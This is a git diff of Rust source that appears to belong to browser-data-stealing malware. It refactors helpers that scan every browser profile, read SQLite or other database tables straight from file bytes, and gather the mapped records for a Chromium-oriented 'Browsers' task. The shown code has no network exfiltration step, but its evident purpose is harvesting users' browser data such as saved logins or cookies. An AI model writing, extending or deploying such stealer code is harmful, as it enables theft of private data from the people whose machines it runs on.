@@ -1,7 +1,7 @@
 #![no_std]
 
 extern crate alloc;
-use database::{DatabaseReader, TableRecord};
+use database::{DatabaseReader, Databases, TableRecord};
 mod chromium;
 
 use crate::alloc::borrow::ToOwned;
@@ -11,7 +11,6 @@ use crate::chromium::ChromiumTask;
 use alloc::vec;
 use alloc::vec::Vec;
 use core::fmt::{Display, Formatter};
-use database::read_sqlite3_database_by_bytes;
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use utils::path::{Path, WriteToFile};
@@ -32,6 +31,50 @@ impl BrowsersTask {
 
 impl_composite_task_runner!(BrowsersTask, "Browsers");
 
+pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, F, R, T, S>(
+    profiles: &[Path],
+    path: P,
+    table: S,
+    mapper: F
+) -> Option<Vec<T>>
+where
+    P: Fn(&Path) -> R,
+    R: AsRef<Path>,
+    F: Fn(&dyn TableRecord) -> Option<T>,
+    T: Ord,
+    S: AsRef<str>
+{
+    collect_and_read_from_all_profiles(profiles, Databases::Sqlite, path, table, mapper)
+}
+
+
+pub(crate) fn collect_and_read_from_all_profiles<D, P, R, F, T, S>(
+    profiles: &[Path],
+    db_type: D,
+    path: P,
+    table: S,
+    mapper: F
+) -> Option<Vec<T>>
+where
+    D: AsRef<Databases>,
+    P: Fn(&Path) -> R,
+    R: AsRef<Path>,
+    F: Fn(&dyn TableRecord) -> Option<T>,
+    T: Ord,
+    S: AsRef<str>,
+{
+    collect_from_all_profiles(profiles, |profile| {
+        let db_path = path(profile);
+
+        if !db_path.as_ref().is_exists() {
+            None
+        } else {
+            read_and_map_records(&db_type, db_path.as_ref(), table.as_ref(), &mapper)
+        }
+    })
+}
+
+
 pub(crate) fn collect_from_all_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
 where
     F: Fn(&Path) -> Option<Vec<T>>,
@@ -42,7 +85,7 @@ where
         .filter_map(|profile| f(profile))
         .flat_map(|v| v.into_iter())
         .collect();
-    
+
     if data.is_empty() {
         None
     } else {
@@ -65,22 +108,24 @@ where
         .write_to(dst)
 }
 
-pub(crate) fn read_sqlite3_and_map_records<T, F>(
+pub(crate) fn read_and_map_records<D, T, F>(
+    db_type: D,
     path: &Path,
     table_name: &str,
     mapper: F,
 ) -> Option<Vec<T>>
 where
+    D: AsRef<Databases>,
     F: Fn(&dyn TableRecord) -> Option<T>,
 {
     let bytes = path.read_file().ok()?;
-    let db = read_sqlite3_database_by_bytes(&bytes)?;
+    let db = db_type.as_ref().read_from_bytes(&bytes).ok()?;
     let table = db.read_table(table_name)?;
-    
+
     let records = table
         .filter_map(|record| mapper(&record))
         .collect();
-    
+
     Some(records)
 }
 
